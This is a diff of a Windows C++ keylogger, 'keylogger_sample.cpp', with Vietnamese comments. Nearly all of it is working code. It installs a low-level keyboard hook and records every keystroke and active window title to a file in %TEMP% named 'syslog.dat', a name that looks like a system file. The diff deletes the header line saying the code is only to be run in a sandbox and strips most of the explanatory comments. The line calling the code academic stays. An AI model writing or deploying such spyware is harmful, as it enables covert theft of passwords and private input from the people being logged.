@@ -1,5 +1,5 @@
 // keylogger_sample.cpp
-// MUC DICH HOC THUAT - CHI CHAY TRONG MOI TRUONG SANDBOX
+// MUC DICH HOC THUAT 
 #include <windows.h>
 #include <stdio.h>
 #include <time.h>
@@ -10,9 +10,6 @@ HHOOK   g_hKeyboardHook = NULL;   // Handle toi keyboard hook
 HANDLE  g_hLogFile       = NULL;   // Handle toi file log
 HWND    g_hLastWindow    = NULL;   // Cua so active truoc do
 
-// ============================================
-// Ham: GetLogFilePath - Lay duong dan file log
-// ============================================
 void GetLogFilePath(LPSTR lpszPath, DWORD dwSize) {
     char szTemp[MAX_PATH];
     GetTempPathA(MAX_PATH, szTemp);          // %TEMP%
@@ -20,9 +17,7 @@ void GetLogFilePath(LPSTR lpszPath, DWORD dwSize) {
     lstrcatA(lpszPath, "syslog.dat");
 }
 
-// ============================================
-// Ham: WriteLog - Ghi chuoi vao file log
-// ============================================
+
 void WriteLog(LPCSTR lpszText) {
     if (g_hLogFile == INVALID_HANDLE_VALUE || g_hLogFile == NULL)
         return;
@@ -34,9 +29,7 @@ void WriteLog(LPCSTR lpszText) {
               NULL);                         // Khong dung overlapped I/O
 }
 
-// ============================================
-// Ham: LogWindowContext - Ghi ten cua so hien tai
-// ============================================
+
 void LogWindowContext() {
     HWND hForeground = GetForegroundWindow();
     if (hForeground == g_hLastWindow) return;  // Khong thay doi
@@ -50,13 +43,7 @@ void LogWindowContext() {
     WriteLog(szBuf);
 }
 
-// ============================================
-// CALLBACK: LowLevelKeyboardProc
-// Duoc goi boi Windows khi co phim duoc nhan/tha
-// nCode  : >= 0 neu can xu ly, < 0 skip
-// wParam : WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN...
-// lParam : Con tro toi KBDLLHOOKSTRUCT
-// ============================================
+
 LRESULT CALLBACK LowLevelKeyboardProc(
     int    nCode,
     WPARAM wParam,
@@ -75,7 +62,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(
 
         char szKey[64] = {0};
 
-        // --- Xu ly cac phim dac biet ---
+
         switch (vkCode) {
             case VK_RETURN:  lstrcpyA(szKey, "[ENTER]\n"); break;
             case VK_BACK:    lstrcpyA(szKey, "[BACKSPACE]"); break;
@@ -89,7 +76,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(
             case VK_MENU:    lstrcpyA(szKey, "[ALT]"); break;
             case VK_CAPITAL: lstrcpyA(szKey, "[CAPSLOCK]"); break;
             default: {
-                // --- Chuyen doi Virtual Key sang ky tu Unicode ---
+            
                 BYTE keyState[256];
                 GetKeyboardState(keyState);  // Lay trang thai tat ca phim
 
@@ -116,17 +103,15 @@ LRESULT CALLBACK LowLevelKeyboardProc(
             WriteLog(szKey);  // Ghi keystroke vao file
     }
 
-    // QUAN TRONG: Phai goi CallNextHookEx de khong block input
+
     return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
 }
 
-// ============================================
-// WinMain - Entry point
-// ============================================
+
 int WINAPI WinMain(
     HINSTANCE hInstance, HINSTANCE, LPSTR, int)
 {
-    // --- Mo file log (tao moi neu chua ton tai, append neu co) ---
+
     char szLogPath[MAX_PATH];
     GetLogFilePath(szLogPath, MAX_PATH);
 
@@ -141,10 +126,10 @@ int WINAPI WinMain(
         NULL
     );
 
-    // Di chuyen con tro ve cuoi file (append mode)
+
     SetFilePointer(g_hLogFile, 0, NULL, FILE_END);
 
-    // Ghi timestamp bat dau session
+
     char szTs[128];
     SYSTEMTIME st; GetLocalTime(&st);
     wsprintfA(szTs, "\n=== SESSION START %02d/%02d/%04d %02d:%02d:%02d ===\n",
@@ -152,7 +137,7 @@ int WINAPI WinMain(
               st.wHour, st.wMinute, st.wSecond);
     WriteLog(szTs);
 
-    // --- Cai dat Low-Level Keyboard Hook ---
+
     g_hKeyboardHook = SetWindowsHookEx(
         WH_KEYBOARD_LL,            // Loai hook: Low-Level Keyboard
         LowLevelKeyboardProc,      // Dia chi ham callback
@@ -165,8 +150,7 @@ int WINAPI WinMain(
         return 1;  // Loi: khong cai hook duoc
     }
 
-    // --- Message Loop - BAT BUOC de hook hoat dong ---
-    // Windows dispatch messages; hook chi nhan event khi co message loop
+
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
